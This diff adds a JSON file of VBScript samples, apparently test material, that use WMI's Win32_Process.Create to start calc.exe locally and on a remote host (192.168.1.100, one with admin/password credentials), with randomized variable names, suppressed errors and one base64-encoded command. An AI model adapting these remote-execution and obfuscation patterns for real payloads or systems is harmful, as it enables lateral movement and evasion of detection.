@@ -1,0 +1,82 @@
+{
+  "local_dot": {
+    "description": "Local connection using dot (.) notation",
+    "type": "local",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "local_localhost": {
+    "description": "Local connection using 'localhost' string",
+    "type": "local",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\"localhost\", \"root\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "local_127001": {
+    "description": "Local connection using 127.0.0.1 loopback",
+    "type": "local",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\"127.0.0.1\", \"root\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "remote_ip": {
+    "description": "Remote connection using IP address (example)",
+    "type": "remote",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\"192.168.1.100\", \"root\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "remote_authenticated": {
+    "description": "Remote connection with username/password",
+    "type": "remote_auth",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\"192.168.1.100\", \"root\\cimv2\", \"admin\", \"password\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "impersonation_level": {
+    "description": "Connection with impersonation level (delegate=3)",
+    "type": "security",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\cimv2\")\nobjConn_TAOIPyKX.Security_.ImpersonationLevel = 3\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "authentication_level": {
+    "description": "Connection with packet-level authentication",
+    "type": "security",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\cimv2\")\nobjConn_TAOIPyKX.Security_.AuthenticationLevel = 6\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "winmgmt_namespace": {
+    "description": "Connection using winmgmt root namespace",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"\\\\\\\\.\\\\root\\\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "wdm_namespace": {
+    "description": "Connection using WDM (driver model) namespace",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\\\WDM\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "dcim_namespace": {
+    "description": "Connection using DCIM namespace",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\\\dcim\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "hardware_namespace": {
+    "description": "Connection using hardware namespace",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\\\hardware\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "cimv1_namespace": {
+    "description": "Connection using CIMv1 (legacy) namespace",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\\\cimv1\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "default_namespace": {
+    "description": "Connection with empty namespace (default cimv2)",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "full_path_namespace": {
+    "description": "Connection using full UNC-style path",
+    "type": "namespace",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"\\\\\\\\root\\\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "security_flags": {
+    "description": "Connection with security flags enabled",
+    "type": "security",
+    "code": "Dim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\".\", \"root\\cimv2\", \"\", \"\", \"\", \"\", 128)\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nobjSvc_kXVvaqTp.Create \"calc.exe\"\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  },
+  "encoded_remote": {
+    "description": "Remote connection with base64 encoded command",
+    "type": "remote_obfuscated",
+    "code": "Function DecodeBase64(encoded)\n    Dim xmlDoc, node\n    Set xmlDoc = CreateObject(\"MSXML2.DOMDocument\")\n    Set node = xmlDoc.CreateElement(\"tmp\")\n    node.DataType = \"bin.base64\"\n    node.Text = encoded\n    DecodeBase64 = node.NodeTypedValue\nEnd Function\n\nDim objLoc_zwduGyJo, objConn_TAOIPyKX, objSvc_kXVvaqTp, objProc_zYBRnTwK, encCmd_AGxKHxgb\nOn Error Resume Next\nSet objLoc_zwduGyJo = CreateObject(\"WbemScripting.SWbemLocator\")\nSet objConn_TAOIPyKX = objLoc_zwduGyJo.ConnectServer(\"192.168.1.100\", \"root\\cimv2\")\nSet objSvc_kXVvaqTp = objConn_TAOIPyKX.Get(\"Win32_Process\")\nencCmd_AGxKHxgb = DecodeBase64(\"Y2FsYy5leGU=\")\nobjSvc_kXVvaqTp.Create encCmd_AGxKHxgb\nSet objProc_zYBRnTwK = Nothing\nSet objSvc_kXVvaqTp = Nothing\nSet objConn_TAOIPyKX = Nothing\nSet objLoc_zwduGyJo = Nothing\nOn Error GoTo 0"
+  }
+}
